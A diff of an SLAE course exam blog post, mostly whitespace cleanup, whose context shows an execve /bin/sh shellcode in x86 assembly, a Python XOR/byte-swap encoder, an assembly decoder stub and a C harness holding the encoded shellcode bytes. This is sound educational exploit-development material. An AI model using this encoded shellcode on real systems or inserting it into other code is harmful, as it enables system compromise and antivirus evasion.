@@ -21,7 +21,7 @@ We start our weaponized proof of concept from this assembler code
 
 {%highlight assembly%}
 ; Filename: 	execve.nasm
-; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
+; Author:	Paolo Perego <paolo@codiceinsicuro.it>
 ; Website:  	https://codiceinsicuro.it
 ; Blog post:  	https://codiceinsicuro.it/slae/
 ; Twitter:   	@thesp0nge
@@ -29,7 +29,7 @@ We start our weaponized proof of concept from this assembler code
 ; Purpose:	This is the default payload for the customer encoder demo. It
 ; 		will execute "/bin/sh" using execve() system call.
 
-global _start			
+global _start
 
 section .text
 
@@ -37,12 +37,12 @@ _start:
 	xor eax, eax		; init EAX to 0
 	push eax		; pushing 0 to the stack to be used as NULL
 				; ending character for /bin/sh string
-	
-	; execve is defined as #define __NR_execve 11 in 
+
+	; execve is defined as #define __NR_execve 11 in
 	; /usr/include/i386-linux-gnu/asm/unistd_32.h:
 	;
-	; system call prototype is: 
-        ; int execve(const char *filename, char *const argv[], 
+	; system call prototype is:
+        ; int execve(const char *filename, char *const argv[],
 	; 		char *const envp[]);
 
 	push 0x68732f2f		; pushing //bin/sh into the stack
@@ -183,7 +183,7 @@ def xor(data, key):
 
 def xor_str(a,b):
     result = int(a, 16) ^ int(b, 16) # convert to integers and xor them
-    return '{:x}'.format(result) 
+    return '{:x}'.format(result)
 
 def swap(x):
     s=x[6:8] + x[4:6] + x[2:4] + x[0:2]
@@ -217,7 +217,7 @@ def main(argv):
     ss= '{:x}'.format(shellcode_len)
     shell_len_string = swap(xor_str(ss*4, "deadbeef"))
     print "payload string:\t" + shell_len_string
-    
+
 
     padded_xor_hex=""
     for i in textwrap.wrap(padded_hex, 8):
@@ -255,7 +255,7 @@ and then it passes the execution to the extracted code.
 
 {% highlight assembly %}
 ; Filename: 	dead_decoder.nasm
-; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
+; Author:	Paolo Perego <paolo@codiceinsicuro.it>
 ; Website:  	https://codiceinsicuro.it
 ; Blog post:  	https://codiceinsicuro.it/slae/
 ; Twitter:   	@thesp0nge
@@ -263,7 +263,7 @@ and then it passes the execution to the extracted code.
 ; Purpose:	This shellcode will decode an execve payload encoded using
 ;		custom schema, with XOR and byte flipping
 
-global _start			
+global _start
 
 section .text
 
@@ -277,14 +277,14 @@ decoder:
 	xor ebx, ebx
 	xor ecx, ecx
 	xor edx, edx
-	
+
 	; As assumption, the first double word in our shellcode is the XOR
 	; encoded payload length
 	mov edx, dword [esi + eax]
 	xor edx, 0xdeadbeef
-	
+
 	add al, 4
-	
+
 decode:
 	mov ebx, dword [esi+eax]
 	inc ecx
@@ -300,7 +300,7 @@ decode:
 	mov [edi], ebx
 	add edi, 4
 	add al, 4
-	
+
 	jmp short decode
 
 
@@ -326,7 +326,7 @@ test our shellcode and I executed it in order to check the payload is correct.
 unsigned char code[] = \
 "\xeb\x2f\x5e\x8d\x3e\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x8b\x14\x06\x81\xf2\xef\xbe\xad\xde\x04\x04\x8b\x1c\x06\x41\x38\xd1\x74\x16\x81\xf3\xef\xbe\xad\xde\x0f\xcb\x89\x1f\x83\xc7\x04\x04\x04\xeb\xe7\xe8\xcc\xff\xff\xff\xf7\xa6\xb5\xc6\x87\xee\x6d\xef\x87\xcd\x82\xf1\x86\xdc\x82\xb6\xde\x5d\x24\xb0\x5f\x6c\x9c\x17\x7f\x3e\x60\xd5";
 
-		       
+
 int main(int argc, char **argv)
 {
 	printf("Shellcode Length:  %d\n", strlen(code));
@@ -352,7 +352,6 @@ malicious.
 
 Here you can find the custom encoder weaponized code in action.
 
-{% asciicast 194068 %}
 
 
 ## SLAE Exam Statement
@@ -362,4 +361,3 @@ This blog post has been created for completing the requirements of the SecurityT
 [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
 
 Student ID: SLAE-1217
-
